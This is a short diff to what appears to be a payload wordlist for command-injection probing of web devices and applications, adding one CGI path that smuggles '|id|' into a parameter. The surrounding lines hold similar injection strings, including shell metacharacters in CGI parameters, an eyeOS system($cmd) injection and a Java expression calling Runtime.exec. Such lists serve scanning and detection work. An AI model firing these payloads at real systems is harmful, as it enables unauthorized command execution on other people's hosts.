@@ -252,6 +252,7 @@ ${t(org.apache.commons.io.ioutils).tostring(t(java.lang.runtime).getruntime().ex
 /api/ping/;`id`
 /cgi-bin/live_api.cgi?page={{str}}&id={{num}}&ip=;id;
 /cgi-bin/mastercgi?ping=nomip&user=;id;
+/cgi-bin/operator/servetest?cmd=ntp&servername=pool.ntp.org&timezone=03:00|id||'
 /dgn/dgn_tools/ping.php?ipdm=2;id;
 /eyeos/desktop.php?baccio=eyeoptions.eyeapp&a=eyeoptions.eyeapp&_session%5busr%5d=root&_session%5bapps%5d%5beyeoptions.eyeapp%5d%5bwrapup%5d=system($cmd);&cmd=id
 /index.html|id|
